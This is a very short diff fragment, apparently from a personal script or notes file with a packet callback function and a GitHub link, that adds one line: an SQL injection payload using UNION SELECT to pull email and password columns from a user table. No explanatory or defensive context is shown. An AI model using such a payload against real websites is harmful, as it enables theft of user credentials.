@@ -207,3 +207,4 @@ def packet_calback(packet):
 
 
 https://github.com/1R5HAD/crypto
+xx' IN (itemnum,sdesc,ldesc) union select email,passwd,123,123 from userdb LIMIT 2 --
